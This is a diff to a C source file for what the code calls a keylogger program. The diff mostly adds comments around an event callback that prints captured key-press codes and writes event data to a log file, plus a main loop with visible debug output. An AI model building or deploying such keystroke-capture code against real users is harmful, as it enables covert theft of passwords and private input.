@@ -8,12 +8,16 @@
 
 static volatile int running = 1;
 
+// Function is triggered by hooks and processes different types of events
 static void event_callback(const Event* event) {
     if (!event) return;
     
     printf("Event received: type=%d\n", event->type);
 
+    // Buffer to format event data for logging
     char event_data[1024];
+
+     // Handle different event types
     switch(event->type) {
         case EVENT_KEY_PRESS:
             printf("Key Press Detected: %lu\n", event->data.keyboard.vkCode);
@@ -35,16 +39,18 @@ static void event_callback(const Event* event) {
             return;
     }
     
-    // Add to buffer and write to log file
+    // Add event to buffer and write it to log file
     add_to_buffer(event_data, strlen(event_data));
     write_to_log(event_data, strlen(event_data));
 }
 
+// Signal handler for cleanup during termination
 void cleanup_handler(int signum) {
     printf("Signal received: %d. Setting running to 0.\n", signum);
     running = 0;
 }
 
+// Entry point of the keylogger program
 int main() {
     DWORD error;
     char input;
@@ -97,7 +103,7 @@ int main() {
     printf("[DEBUG] Starting main loop. Press Ctrl+C to exit.\n");
     fflush(stdout);
 
-    // Main loop with more debug output
+    // // Main loop: continuously process events
     while (running) {
         printf("[DEBUG] Processing events...\n");
         fflush(stdout);
@@ -106,7 +112,8 @@ int main() {
         }
         Sleep(100);
     }
-
+    
+    // Perform cleanup after termination
     printf("[DEBUG] Cleaning up...\n");
     cleanup_logger();
     cleanup_buffer();
